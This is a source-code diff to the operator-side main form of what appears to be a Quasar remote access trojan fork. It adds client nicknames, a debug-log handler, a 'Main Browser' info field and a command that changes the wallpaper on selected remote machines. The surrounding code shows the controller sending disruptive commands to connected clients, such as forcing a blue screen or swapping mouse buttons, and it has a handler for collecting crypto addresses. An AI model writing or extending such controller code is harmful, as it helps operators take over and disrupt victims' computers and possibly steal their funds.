@@ -26,6 +26,10 @@ using System.Text.Json;
 using System.Drawing;
 using System.Xml;
 using Quasar.Common.Messages.Monitoring.VirtualMonitor;
+using Newtonsoft.Json;
+
+using Quasar.Common.Messages.UserSupport;
+
 
 namespace Quasar.Server.Forms
 {
@@ -34,14 +38,15 @@ namespace Quasar.Server.Forms
         public QuasarServer ListenServer { get; set; }
         private DiscordRPC.DiscordRPC _discordRpc;  // Added Discord RPC
 
-        private const int STATUS_ID = 4;
-        private const int CURRENTWINDOW_ID = 5;
-        private const int USERSTATUS_ID = 6;
+        private const int STATUS_ID = 5;
+        private const int CURRENTWINDOW_ID = 6;
+        private const int USERSTATUS_ID = 7;
 
         private bool _titleUpdateRunning;
         private bool _processingClientConnections;
         private readonly ClientStatusHandler _clientStatusHandler;
         private readonly GetCryptoAddressHandler _getCryptoAddressHander;
+        private readonly ClientDebugLog _clientDebugLogHandler;
         private readonly Queue<KeyValuePair<Client, bool>> _clientConnections = new Queue<KeyValuePair<Client, bool>>();
         private readonly object _processingClientConnectionsLock = new object();
         private readonly object _lockClients = new object();
@@ -51,6 +56,7 @@ namespace Quasar.Server.Forms
         {
             _clientStatusHandler = new ClientStatusHandler();
             _getCryptoAddressHander = new GetCryptoAddressHandler();
+            _clientDebugLogHandler = new ClientDebugLog();
             RegisterMessageHandler();
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
@@ -69,8 +75,19 @@ namespace Quasar.Server.Forms
             }
         }
 
+        private void OnLogReceived(object sender, Client client, string log)
+        {
+            if (this.InvokeRequired)
+            {
+                this.Invoke(new Action(() => OnLogReceived(sender, client, log)));
+                return;
+            }
+        }
+
         private void RegisterMessageHandler()
         {
+            MessageHandler.Register(_clientDebugLogHandler);
+            _clientDebugLogHandler.DebugLogReceived += OnLogReceived;
             MessageHandler.Register(_clientStatusHandler);
             _clientStatusHandler.StatusUpdated += SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated += SetUserStatusByClient;
@@ -81,6 +98,8 @@ namespace Quasar.Server.Forms
 
         private void UnregisterMessageHandler()
         {
+            MessageHandler.Unregister(_clientDebugLogHandler);
+            _clientDebugLogHandler.DebugLogReceived -= OnLogReceived;
             MessageHandler.Unregister(_clientStatusHandler);
             _clientStatusHandler.StatusUpdated -= SetStatusByClient;
             _clientStatusHandler.UserStatusUpdated -= SetUserStatusByClient;
@@ -352,7 +371,7 @@ namespace Quasar.Server.Forms
                     _previewImageHandler.Dispose();
                 }
 
-                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, listView1);
+                _previewImageHandler = new PreviewHandler(selectedClients[0], pictureBoxMain, clientInfoListView);
                 MessageHandler.Register(_previewImageHandler);
 
                 GetPreviewImage image = new GetPreviewImage
@@ -369,27 +388,31 @@ namespace Quasar.Server.Forms
                 tableLayoutPanel1.Visible = false;
                 pictureBoxMain.Image = Properties.Resources.no_previewbmp;
 
-                listView1.Items.Clear();
+                clientInfoListView.Items.Clear();
 
                 var cpuItem = new ListViewItem("CPU");
                 cpuItem.SubItems.Add("N/A");
-                listView1.Items.Add(cpuItem);
+                clientInfoListView.Items.Add(cpuItem);
 
                 var gpuItem = new ListViewItem("GPU");
                 gpuItem.SubItems.Add("N/A");
-                listView1.Items.Add(gpuItem);
+                clientInfoListView.Items.Add(gpuItem);
 
                 var ramItem = new ListViewItem("RAM");
                 ramItem.SubItems.Add("0 GB");
-                listView1.Items.Add(ramItem);
+                clientInfoListView.Items.Add(ramItem);
 
                 var uptimeItem = new ListViewItem("Uptime");
                 uptimeItem.SubItems.Add("N/A");
-                listView1.Items.Add(uptimeItem);
+                clientInfoListView.Items.Add(uptimeItem);
 
                 var antivirusItem = new ListViewItem("Antivirus");
                 antivirusItem.SubItems.Add("N/A");
-                listView1.Items.Add(antivirusItem);
+                clientInfoListView.Items.Add(antivirusItem);
+
+                var mainBrowserItem = new ListViewItem("Main Browser");
+                mainBrowserItem.SubItems.Add("N/A");
+                clientInfoListView.Items.Add(mainBrowserItem);
             }
         }
 
@@ -791,15 +814,17 @@ namespace Quasar.Server.Forms
         private void AddClientToListview(Client client)
         {
             if (client == null) return;
+            string nickname = GetClientNickname(client);
 
             try
             {
                 ListViewItem lvi = new ListViewItem(new string[]
                 {
-                    " " + client.EndPoint.Address, client.Value.Tag,
+                    " " + client.EndPoint.Address, nickname, client.Value.Tag,
                     client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
                     client.Value.OperatingSystem, client.Value.AccountType
                 })
+
                 { Tag = client, ImageIndex = client.Value.ImageIndex };
 
                 lstClients.Invoke((MethodInvoker)delegate
@@ -820,6 +845,54 @@ namespace Quasar.Server.Forms
             {
             }
         }
+
+        private string GetClientNickname(Client client)
+        {
+            if (client?.Value?.DownloadDirectory == null)
+                return string.Empty;
+
+            string jsonFilePath = Path.Combine(client.Value.DownloadDirectory, "client_info.json");
+
+            try
+            {
+                ClientInfo clientInfo = LoadClientInfo(jsonFilePath);
+                return clientInfo?.Nickname ?? string.Empty;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error loading client nickname: {ex.Message}");
+                return string.Empty;
+            }
+        }
+
+        private ClientInfo LoadClientInfo(string filePath)
+        {
+            try
+            {
+                if (!File.Exists(filePath))
+                    return null;
+
+                string json = File.ReadAllText(filePath);
+
+                if (string.IsNullOrWhiteSpace(json))
+                    return null;
+
+                ClientInfo clientInfo = JsonConvert.DeserializeObject<ClientInfo>(json);
+
+                return clientInfo ?? null;
+            }
+            catch (Newtonsoft.Json.JsonException ex)
+            {
+                Debug.WriteLine($"JSON parsing error: {ex.Message}");
+                return null;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Error reading client info: {ex.Message}");
+                return null;
+            }
+        }
+
 
         private void RemoveClientFromListview(Client client)
         {
@@ -966,6 +1039,34 @@ namespace Quasar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 c.Send(new DoDeElevate());
+            }
+        }
+
+        private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                FrmNickname frmSi = new FrmNickname(c);
+                frmSi.NicknameSaved += FrmSi_NicknameSaved;
+                frmSi.Show();
+                frmSi.Focus();
+            }
+        }
+
+        private void FrmSi_NicknameSaved(object sender, EventArgs e)
+        {
+            if (sender is FrmNickname frmNickname)
+            {
+                UpdateClientNickname(frmNickname.GetClient());
+            }
+        }
+
+        private void UpdateClientNickname(Client client)
+        {
+            var item = GetListViewItemByClient(client);
+            if (item != null)
+            {
+                item.SubItems[1].Text = GetClientNickname(client); 
             }
         }
 
@@ -1306,6 +1407,35 @@ namespace Quasar.Server.Forms
                 c.Send(new DoBSOD());
             }
         }
+
+        private void cWToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog openFileDialog = new OpenFileDialog())
+            {
+                openFileDialog.InitialDirectory = "c:\\";
+                openFileDialog.Filter = "Image Files|*.jpg;*.jpeg;*.png;*.bmp";
+                openFileDialog.FilterIndex = 1;
+                openFileDialog.RestoreDirectory = true;
+
+                if (openFileDialog.ShowDialog() == DialogResult.OK)
+                {
+                    string selectedFilePath = openFileDialog.FileName;
+                    byte[] imageData = File.ReadAllBytes(selectedFilePath);
+                    string imageFormat = Path.GetExtension(selectedFilePath).TrimStart('.').ToLower();
+
+                    foreach (Client c in GetSelectedClients())
+                    {
+                        c.Send(new DoChangeWallpaper
+                        {
+                            ImageData = imageData,
+                            ImageFormat = imageFormat
+                        });
+                    }
+                }
+            }
+        }
+
+
 
         private void swapMouseButtonsToolStripMenuItem_Click(object sender, EventArgs e)
         {
